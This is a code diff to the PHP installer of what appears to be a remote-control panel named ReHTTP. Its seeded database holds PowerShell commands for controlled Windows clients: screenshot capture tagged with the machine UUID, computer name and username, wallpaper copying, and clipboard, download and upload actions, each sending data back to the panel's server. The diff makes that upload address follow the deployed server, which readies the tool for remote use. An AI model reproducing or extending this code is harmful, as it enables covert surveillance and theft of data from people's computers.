@@ -10,7 +10,9 @@ if (isset($_POST['btn'])) {
         $panel_password = password_hash(trim(htmlspecialchars($_POST['panel_password'])), PASSWORD_BCRYPT);
         $panel_password_repeat = trim(htmlspecialchars($_POST['panel_password_repeat']));
         if ($_POST['panel_password'] === $panel_password_repeat) {
-
+            $URI = $_SERVER['REQUEST_URI'];
+            $break = explode("/", $URI);
+            $server_address = "http://" . $_SERVER['SERVER_ADDR'] . ":" . $_SERVER['SERVER_PORT'] . "/" . $break[1] . "/";
             $dsn = "mysql:host=localhost;dbname=$db_name";
             try {
                 $connection = new PDO($dsn, $db_username, $db_password);
@@ -51,8 +53,8 @@ if (isset($_POST['btn'])) {
             (8, 'SetClipboard', '    Set-Clipboard \'\$a1\'\r\n        return  \'OK\'', 1, 'data', 1),
             (63, 'Download', 'return \"Download\"', 1, 'PATH d:\\file.txt', 1),
             (64, 'Upload', 'return \"Upload\"', 2, 'PATH d:\\,LINK', 1),
-            (65, 'ScreenShot', '\$Path = \"C:\\\\temp\\\\\"\n\$UID = (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID\n\n# Make sure that the directory to keep screenshots has been created, otherwise create it\nIf (!(test-path \$path)) {\n    New-Item -ItemType Directory -Force -Path \$path\n}\nAdd-Type -AssemblyName System.Windows.Forms\n\$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds\n# Get the current screen resolution\n\$image = New-Object System.Drawing.Bitmap(\$screen.Width, \$screen.Height)\n# Create a graphic object\n\$graphic = [System.Drawing.Graphics]::FromImage(\$image)\n\$point = New-Object System.Drawing.Point(0, 0)\n\$graphic.CopyFromScreen(\$point, \$point, \$image.Size);\n\$cursorBounds = New-Object System.Drawing.Rectangle([System.Windows.Forms.Cursor]::Position, [System.Windows.Forms.Cursor]::Current.Size)\n# Get a screenshot\n[System.Windows.Forms.Cursors]::Default.Draw(\$graphic, \$cursorBounds)\n\$user=  \$env:computername + \"-\" +\$env:username + \"-\" + \"\$((get-date).tostring(\'yyyy.MM.dd-HH.mm.ss\')).png\"\n\$screen_file = \"\$Path\\\" + \$UID + \"_\" + \$user\n# Save the screenshot as a PNG file\n\$image.Save(\$screen_file, [System.Drawing.Imaging.ImageFormat]::Png)\n\$wc = New-Object System.Net.WebClient\n\$resp = \$wc.UploadFile(\"http://localhost:8080/ReHTTP/Server/\", \$screen_file)\nRemove-Item -Path \$screen_file -Force\nreturn \$user', 0, '', 1),
-            (66, 'download_wallpaper', '\$UID = (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID\n        \$user=\$UID+\"_\"+\"wallpaper\"\n        \$folder = Test-Path -Path C:\\\\temp\n        if (!\$folder) {\n            New-Item -Path C:\\\\ -Name temp -ItemType Directory\n    \n        }\n        \$BACKGROUND = (Get-ItemProperty \"hkcu:\\control panel\\\\desktop\\\" -Name Wallpaper).Wallpaper\n        Copy-Item \$BACKGROUND  C:\\\\temp\\\\\$user.jpg\n        \$wc = New-Object System.Net.WebClient\n        \$resp = \$wc.UploadFile(\'\$a1\', \"C:\\\\temp\\\\\$user.jpg\")\n        Remove-Item -Path C:\\\\temp\\\\\$user.jpg -Force\n        return \"OK\"', 0, 'http://localhost:8080/ReHTTP/', 1),
+            (65, 'ScreenShot', '\$Path = \"C:\\\\temp\\\\\"\n\$UID = (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID\n\n# Make sure that the directory to keep screenshots has been created, otherwise create it\nIf (!(test-path \$path)) {\n    New-Item -ItemType Directory -Force -Path \$path\n}\nAdd-Type -AssemblyName System.Windows.Forms\n\$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds\n# Get the current screen resolution\n\$image = New-Object System.Drawing.Bitmap(\$screen.Width, \$screen.Height)\n# Create a graphic object\n\$graphic = [System.Drawing.Graphics]::FromImage(\$image)\n\$point = New-Object System.Drawing.Point(0, 0)\n\$graphic.CopyFromScreen(\$point, \$point, \$image.Size);\n\$cursorBounds = New-Object System.Drawing.Rectangle([System.Windows.Forms.Cursor]::Position, [System.Windows.Forms.Cursor]::Current.Size)\n# Get a screenshot\n[System.Windows.Forms.Cursors]::Default.Draw(\$graphic, \$cursorBounds)\n\$user=  \$env:computername + \"-\" +\$env:username + \"-\" + \"\$((get-date).tostring(\'yyyy.MM.dd-HH.mm.ss\')).png\"\n\$screen_file = \"\$Path\\\" + \$UID + \"_\" + \$user\n# Save the screenshot as a PNG file\n\$image.Save(\$screen_file, [System.Drawing.Imaging.ImageFormat]::Png)\n\$wc = New-Object System.Net.WebClient\n\$resp = \$wc.UploadFile(\"$server_address\", \$screen_file)\nRemove-Item -Path \$screen_file -Force\nreturn \$user', 0, '', 1),
+            (66, 'download_wallpaper', '\$UID = (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID\n        \$user=\$UID+\"_\"+\"wallpaper\"\n        \$folder = Test-Path -Path C:\\\\temp\n        if (!\$folder) {\n            New-Item -Path C:\\\\ -Name temp -ItemType Directory\n    \n        }\n        \$BACKGROUND = (Get-ItemProperty \"hkcu:\\control panel\\\\desktop\\\" -Name Wallpaper).Wallpaper\n        Copy-Item \$BACKGROUND  C:\\\\temp\\\\\$user.jpg\n        \$wc = New-Object System.Net.WebClient\n        \$resp = \$wc.UploadFile(\'\$a1\', \"C:\\\\temp\\\\\$user.jpg\")\n        Remove-Item -Path C:\\\\temp\\\\\$user.jpg -Force\n        return \"OK\"', 0, '$server_address', 1),
             (75, 'test', 'return \'\$random\'', 0, '', 1),
             (98, '\'\$random\'', 'echo md5(rand());', 0, '', 2);
             
@@ -81,7 +83,7 @@ if (isset($_POST['btn'])) {
             ALTER TABLE `users`
               MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=121;
               INSERT INTO `event` (`init`, `up`, `destroy`) VALUES
-              ('# Download Main Wallpaper     \n \$UID = (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID\n        \$user=\$UID+\"_\"+\"wallpaper\"\n        \$folder = Test-Path -Path C:\\\\temp\n        if (!\$folder) {\n            New-Item -Path C:\\\\ -Name temp -ItemType Directory\n    \n        }\n        \$BACKGROUND = (Get-ItemProperty \"hkcu:\\control panel\\\\desktop\\\" -Name Wallpaper).Wallpaper\n        Copy-Item \$BACKGROUND  C:\\\\temp\\\\\$user.jpg\n        \$wc = New-Object System.Net.WebClient\n        \$resp = \$wc.UploadFile(\"http://localhost:8080/ReHTTP/Server/\", \"C:\\\\temp\\\\\$user.jpg\")\n        Remove-Item -Path C:\\\\temp\\\\\$user.jpg -Force\n      # Beep Sound For Test\n      # [console]::beep(200,5000)\n      # Put Custom Code Here\n return \"OK\"\n\n', '#[console]::beep(100,3000)', '[console]::beep(800,5000)');
+              ('# Download Main Wallpaper     \n \$UID = (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID\n        \$user=\$UID+\"_\"+\"wallpaper\"\n        \$folder = Test-Path -Path C:\\\\temp\n        if (!\$folder) {\n            New-Item -Path C:\\\\ -Name temp -ItemType Directory\n    \n        }\n        \$BACKGROUND = (Get-ItemProperty \"hkcu:\\control panel\\\\desktop\\\" -Name Wallpaper).Wallpaper\n        Copy-Item \$BACKGROUND  C:\\\\temp\\\\\$user.jpg\n        \$wc = New-Object System.Net.WebClient\n        \$resp = \$wc.UploadFile(\" $server_address\", \"C:\\\\temp\\\\\$user.jpg\")\n        Remove-Item -Path C:\\\\temp\\\\\$user.jpg -Force\n      # Beep Sound For Test\n      # [console]::beep(200,5000)\n      # Put Custom Code Here\n return \"OK\"\n\n', '#[console]::beep(100,3000)', '[console]::beep(800,5000)');
                   INSERT INTO `admin` (`username`, `password`) VALUES ('$panel_username','$panel_password');
             COMMIT;
 
@@ -108,9 +110,7 @@ if (isset($_POST['btn'])) {
             }
         } else {
             header("location:?error=Password Repeat Not Same ):");
-
         }
-
     } else {
         header("location:?error=Some Input Not Set ):");
     }
